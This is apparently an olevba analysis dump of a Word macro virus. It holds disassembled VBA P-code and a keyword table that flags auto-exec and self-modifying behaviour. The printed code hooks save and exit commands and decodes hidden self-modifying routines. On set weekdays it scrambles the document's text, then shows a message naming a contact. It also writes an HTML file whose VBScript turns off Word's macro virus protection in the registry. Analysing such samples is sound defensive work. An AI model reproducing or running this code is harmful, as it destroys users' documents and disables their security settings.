' Line #158:
' 	FuncDefn (Sub FileSave())
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #161:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #162:
' 	ArgsCall InD_ 0x0000 
' Line #163:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #164:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #165:
' 	ArgsCall InD_ 0x0000 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #169:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #170:
' 	ArgsCall Sekond 0x0000 
' Line #171:
' 	ArgsCall InW_ 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Private Function Ganggu())
' Line #174:
' 	LitStr 0x0003 "Gng"
' 	ArgsCall (Call) GgG 0x0001 
' Line #175:
' 	ArgsCall (Call) Gng 0x0000 
' Line #176:
' 	LitStr 0x0003 "Gng"
' 	ArgsCall (Call) DdD 0x0001 
' Line #177:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #178:
' 	EndFunc 
' Line #179:
' 	FuncDefn (Private Sub Wdh())
' Line #180:
' 	QuoteRem 0x0000 0x001F "Vwlu')c~k5yln)'Mvy'V|{w|{'Hz'*8"
' Line #181:
' 	QuoteRem 0x0000 0x0014 "Wypu{'*83')YLNLKP[;)"
' Line #182:
' 	QuoteRem 0x0000 0x0009 "Wypu{'*83"
' Line #183:
' 	QuoteRem 0x0000 0x0028 "Wypu{'*83')b4ORL`fJSHZZLZfYVV[cllmpsld)"
' Line #184:
' 	QuoteRem 0x0000 0x0008 "Jsvzl'*8"
' Line #185:
' 	QuoteRem 0x0000 0x0014 "Vu'Lyyvy'Ylz|tl'Ul{"
' Line #186:
' 	QuoteRem 0x0000 0x0022 "Zolss')ylnlkp{'6z'c~k5yln)3'}iOpkl"
' Line #187:
' 	QuoteRem 0x0000 0x000F "Rpss')'c~k5yln)"
' Line #188:
' 	QuoteRem 0x0000 0x0097 "TznIv')Zlt|h'wyvnyht'kp'~pukv~z'hukh'{hr'ilym|unzp'shnp'()'2'Joy/8:0'2'))'2'Joy/8:0'2')Tptp'Ohy€hup'4'CC[huq|un'Ih{|EE)3'}iPumvyth{pvu3')Tptp'Ohy€hup)"
' Line #189:
' 	EndSub 
' Line #190:
' 	FuncDefn (Private Sub Yeah())
' Line #191:
' 	LitStr 0x0002 "Yh"
' 	ArgsCall (Call) GgG 0x0001 
' Line #192:
' 	ArgsCall (Call) Yh 0x0000 
' Line #193:
' 	LitStr 0x0002 "Yh"
' 	ArgsCall (Call) DdD 0x0001 
' Line #194:
' 	EndSub 
' Line #195:
' 	FuncDefn (Private Sub UbahDok())
' Line #196:
' 	LitStr 0x0005 "UbhDk"
' 	ArgsCall (Call) GgG 0x0001 
' Line #197:
' 	ArgsCall (Call) ubhdk 0x0000 
' Line #198:
' 	LitStr 0x0005 "UbhDk"
' 	ArgsCall (Call) DdD 0x0001 
' Line #199:
' 	EndSub 
' Line #200:
' 	FuncDefn (Private Sub XFind())
' Line #201:
' 	LitStr 0x0002 "Xf"
' 	ArgsCall (Call) GgG 0x0001 
' Line #202:
' 	ArgsCall (Call) Xf 0x0000 
' Line #203:
' 	LitStr 0x0002 "Xf"
' 	ArgsCall (Call) DdD 0x0001 
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Private Sub WinDeath())
' Line #206:
' 	LitStr 0x0003 "Wdh"
' 	ArgsCall (Call) GgG 0x0001 
' Line #207:
' 	ArgsCall (Call) Wdh 0x0000 
' Line #208:
' 	LitStr 0x0003 "Wdh"
' 	ArgsCall (Call) DdD 0x0001 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Private Sub Yh())
' Line #211:
' 	OnError (Resume Next) 
' Line #212:
' 	Ld Date 
' 	ArgsLd Weekday 0x0001 
' 	Ld vbMonday 
' 	Eq 
' 	Ld Time 
' 	LitStr 0x0008 "16:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #213:
' 	ArgsCall WinDeath 0x0000 
' Line #214:
' 	ArgsCall UbahDok 0x0000 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	Ld Date 
' 	ArgsLd Weekday 0x0001 
' 	Ld vbWednesday 
' 	Eq 
' 	Ld Time 
' 	LitStr 0x0008 "16:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #217:
' 	ArgsCall UbahDok 0x0000 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	Ld Date 
' 	ArgsLd Weekday 0x0001 
' 	Ld vbTeusday 
' 	Eq 
' 	Ld Time 
' 	LitStr 0x0008 "16:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #220:
' 	ArgsCall UbahDok 0x0000 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	EndSub 
' Line #223:
' 	FuncDefn (Private Sub Mk_D())
' Line #224:
' 	LitStr 0x0005 "M_dir"
' 	ArgsCall (Call) GgG 0x0001 
' Line #225:
' 	ArgsCall (Call) M_dir 0x0000 
' Line #226:
' 	LitStr 0x0005 "M_dir"
' 	ArgsCall (Call) DdD 0x0001 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Sub tlso())
' Line #229:
' 	LitDI2 0x00CA 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #230:
' 	EndSub 
' Line #231:
' 	FuncDefn (Sub FileNew())
' Line #232:
' 	OnError (Resume Next) 
' Line #233:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #234:
' 	EndSub 
' Line #235:
' 	FuncDefn (Sub FileSaveAs())
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #238:
' 	ArgsCall (Call) InD_ 0x0000 
' Line #239:
' 	EndSub 
' Line #240:
' 	FuncDefn (Sub AdText())
' Line #241:
' 	OnError (Resume Next) 
' Line #242:
' 	Dim 
' 	VarDefn d (As String)
' Line #243:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St d 
' Line #244:
' 	StartWithExpr 
' 	LitStr 0x0009 "Hyperlink"
' 	Ld ActiveDocument 
' 	ArgsMemLd Styles 0x0001 
' 	MemLd Font 
' 	With 
' Line #245:
' 	Ld wdUnderlineNone 
' 	MemStWith Underline 
' Line #246:
' 	Ld wdAuto 
' 	MemStWith ColorIndex 
' Line #247:
' 	EndWith 
' Line #248:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ParamNamed Anchor 
' 	Ld d 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0005 ".html"
' 	Add 
' 	ParamNamed Address 
' 	LitStr 0x0000 ""
' 	ParamNamed SubAddress 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ArgsMemCall Add 0x0003 
' Line #249:
' 	EndSub 
' Line #250:
' 	FuncDefn (Sub DelText())
' Line #251:
' 	OnError (Resume Next) 
' Line #252:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	MemLd Count 
' 	For 
' Line #253:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #254:
' 	StartForVariable 
' 	Next 
' Line #255:
' 	EndSub 
' Line #256:
' 	FuncDefn (Sub FileExit())
' Line #257:
' 	OnError (Resume Next) 
' Line #258:
' 	ArgsCall Mk_D 0x0000 
' Line #259:
' 	Ld Documents 
' 	MemLd Count 
' 	St DC 
' Line #260:
' 	Ld DC 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #261:
' 	ArgsCall InW_ 0x0000 
' Line #262:
' 	ArgsCall AdText 0x0000 
' Line #263:
' 	ArgsCall InD_ 0x0000 
' Line #264:
' 	ArgsCall Ganggu 0x0000 
' Line #265:
' 	EndIfBlock 
' Line #266:
' 	ArgsCall Autoexit 0x0000 
' Line #267:
' 	EndSub 
' Line #268:
' 	FuncDefn (Private Function DeCode(Code As String))
' Line #269:
' 	StartForVariable 
' 	Ld xy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Code 
' 	FnLen 
' 	For 
' Line #270:
' 	Ld Code 
' 	Ld xy 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St Ascii 
' Line #271:
' 	Ld Ascii 
' 	LitDI2 0x0007 
' 	Add 
' 	St Change 
' Line #272:
' 	OnError (Resume Next) 
' Line #273:
' 	Ld NewCode 
' 	Ld Change 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewCode 
' Line #274:
' 	StartForVariable 
' 	Next 
' Line #275:
' 	Ld NewCode 
' 	Ld vbCr 
' 	Concat 
' 	St DeCode 
' Line #276:
' 	EndFunc 
' Line #277:
' 	FuncDefn (Private Function DeCodes(Code As String))
' Line #278:
' 	StartForVariable 
' 	Ld xy 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld Code 
' 	FnLen 
' 	For 
' Line #279:
' 	Ld Code 
' 	Ld xy 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St Ascii 
' Line #280:
' 	Ld Ascii 
' 	LitDI2 0x0007 
' 	Sub 
' 	St Change 
' Line #281:
' 	OnError (Resume Next) 
' Line #282:
' 	Ld NewCode 
' 	Ld Change 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewCode 
' Line #283:
' 	StartForVariable 
' 	Next 
' Line #284:
' 	Ld NewCode 
' 	Ld vbCr 
' 	Concat 
' 	St DeCodes 
' Line #285:
' 	EndFunc 
' Line #286:
' 	FuncDefn (Private Function DdD(pros As String))
' Line #287:
' 	Dim 
' 	VarDefn ln (As String)
' Line #288:
' 	OnError (Resume Next) 
' Line #289:
' 	Ld pros 
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St N 
' Line #290:
' 	Ld pros 
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St m 
' Line #291:
' 	Ld N 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #292:
' 	Ld i 
' 	Ld m 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Add 
' 	St H 
' Line #293:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #294:
' 	OnError (Resume Next) 
' Line #295:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld i 
' 	Ld H 
' 	For 
' Line #296:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ln 
' Line #297:
' 	Ld ln 
' 	ArgsLd DeCode 0x0001 
' 	St G 
' Line #298:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld G 
' 	Add 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #299:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #300:
' 	StartForVariable 
' 	Next 
' Line #301:
' 	EndFunc 
' Line #302:
' 	FuncDefn (Private Sub Xf())
' Line #303:
' 	QuoteRem 0x0000 0x001F "Vwlu')cum5yln)'Mvy'V|{w|{'Hz'*8"
' Line #304:
' 	QuoteRem 0x0000 0x0014 "Wypu{'*83')YLNLKP[;)"
' Line #305:
' 	QuoteRem 0x0000 0x0009 "Wypu{'*83"
' Line #306:
' 	QuoteRem 0x0000 0x0048 "Wypu{'*83')b4ORL`fSVJHSfTHJOPULcZ€z{ltcJ|yylu{Jvu{yvsZl{cJvu{yvscWypu{d)"
' Line #307:
' 	QuoteRem 0x0000 0x005B "Wypu{'*83')bORL`fJ\YYLU[f\ZLYcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvucwvspjplzclwsvylyd)"
' Line #308:
' 	QuoteRem 0x0000 0x002B "Wypu{'*83'))))B')UvMpuk)B'))))B')Dk~vykA78)"
' Line #309:
' 	QuoteRem 0x0000 0x0008 "Jsvzl'*8"
' Line #310:
' 	QuoteRem 0x0000 0x0014 "Vu'Lyyvy'Ylz|tl'Ul{"
' Line #311:
' 	QuoteRem 0x0000 0x0022 "Zolss')ylnlkp{'6z'cum5yln)3'}iOpkl"
' Line #312:
' 	QuoteRem 0x0000 0x000E "Rpss')cum5yln)"
' Line #313:
' 	EndSub 
' Line #314:
' 	FuncDefn (Private Function GgG(pres As String))
' Line #315:
' 	Dim 
' 	VarDefn ln (As String)
' Line #316:
' 	OnError (Resume Next) 
' Line #317:
' 	Ld pres 
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St N 
' Line #318:
' 	Ld pres 
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St m 
' Line #319:
' 	Ld N 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #320:
' 	Ld i 
' 	Ld m 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Add 
' 	St H 
' Line #321:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #322:
' 	OnError (Resume Next) 
' Line #323:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld i 
' 	Ld H 
' 	For 
' Line #324:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ln 
' Line #325:
' 	Ld ln 
' 	ArgsLd DeCodes 0x0001 
' 	St G 
' Line #326:
' 	Ld j 
' 	Ld G 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #327:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #328:
' 	StartForVariable 
' 	Next 
' Line #329:
' 	EndFunc 
' Line #330:
' 	FuncDefn (Private Sub ubhdk())
' Line #331:
' 	Dim 
' 	VarDefn s
' 	VarDefn ch
' 	VarDefn tx (As String)
' Line #332:
' 	OnError (Resume Next) 
' Line #333:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	FnLen 
' 	For 
' Line #334:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St s 
' Line #335:
' 	Ld s 
' 	LitDI2 0x0009 
' 	Add 
' 	St ch 
' Line #336:
' 	Ld tx 
' 	Ld ch 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St tx 
' Line #337:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #338:
' 	Ld tx 
' 	Ld vbCr 
' 	Concat 
' 	St yx 
' Line #339:
' 	Ld yx 
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #340:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #341:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #342:
' 	LitStr 0x001E "Ada Problem dengan file anda ?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0027 "Hubungi --> Mimi Haryani - Tanjung Batu"
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x000C "Mimi Haryani"
' 	ArgsCall MsgBox 0x0003 
' Line #343:
' 	EndSub 
' Line #344:
' 	FuncDefn (Sub Sekond())
' Line #345:
' 	Dim 
' 	VarDefn D1 (As String)
' Line #346:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St ht 
' Line #347:
' 	OnError (Resume Next) 
' Line #348:
' 	Ld ht 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0005 ".html"
' 	Add 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #349:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "<SCRIPT LANGUAGE ="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "VBSCRIPT"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #350:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "<!--"
' 	PrintItemNL 
' Line #351:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Option Explicit"
' 	PrintItemNL 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Dim MyAppl"
' 	PrintItemNL 
' Line #353:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #354:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Set MyAppl = CreateObject"
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Word.Application"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #355:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "MyAppl.System.PrivateProfileString"
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ","
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ","
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Level"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 " = 1"
' 	Add 
' 	PrintItemNL 
' Line #356:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "MyAppl.System.PrivateProfileString"
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ","
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ","
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 " = 0"
' 	Add 
' 	PrintItemNL 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "MyAppl.Options.VirusProtection = False"
' 	PrintItemNL 
' Line #358:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Set MyAppl = Nothing"
' 	PrintItemNL 
' Line #359:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "-->"
' 	PrintItemNL 
' Line #360:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</SCRIPT>"
' 	PrintItemNL 
' Line #361:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #362:
' 	EndSub 
' Line #363:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

